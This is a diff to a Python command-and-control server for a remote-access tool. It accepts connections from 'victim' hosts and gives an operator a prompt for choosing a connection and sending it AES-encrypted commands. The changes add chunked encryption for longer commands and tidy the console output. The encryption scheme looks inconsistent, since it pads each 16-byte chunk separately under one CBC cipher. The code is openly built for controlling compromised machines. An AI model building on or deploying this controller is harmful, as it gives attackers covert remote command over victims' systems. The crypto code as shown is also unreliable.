@@ -1,4 +1,4 @@
-import shlex
+from shlex import split
 import socket
 import threading
 from _thread import *
@@ -10,7 +10,6 @@ from rich.console import Console
 from rich.table import Table
 from rich import box
 from rich.live import Live
-from rich import print
 import queue
 from base64 import b64encode, b64decode
 
@@ -39,8 +38,7 @@ class ConnHandler:
                 victim, address = server.accept()
                 self.connections.append(victim)
                 self.address.append(address)
-                print("")
-                console.log(f"[bold magenta][-] Got connection ->[/bold magenta] {address}", end="")
+                console.print(f"[bold magenta][-] Got connection -> {address}[/bold magenta]", end="")
 
         except socket.error:
             console.print_exception()
@@ -70,7 +68,13 @@ class ConnHandler:
         self.key = urandom(16)
         self.iv = urandom(16)
         aes = AES.new(self.key, AES.MODE_CBC, self.iv)
-        encrypted = aes.encrypt(pad(cmd).encode())  # Needs a check to verify block size
+        if len(cmd) > 16:
+            stream = wrap(cmd, 16)
+            padded = [i if len(i) == 16 else pad(i) for i in stream]
+            encrypted = [aes.encrypt(i.encode()) for i in padded]
+            encrypted = b''.join(encrypted)
+        else:
+            encrypted = aes.encrypt(pad(cmd).encode())
         text_with_key = b64encode(self.key + self.iv + encrypted)
         return text_with_key
 
@@ -111,8 +115,8 @@ class ConnHandler:
     def shlexy(self):
         try:
             while True:
-                cmd = console.input("[green](Shlexy)> [/green]").strip()
-                cmd = shlex.split(cmd)
+                cmd = console.input("[green]x(CMD)> [/green]").strip()
+                cmd = split(cmd)
                 if "list" in cmd:
                     self.list_Connections()
                 elif "use" in cmd:
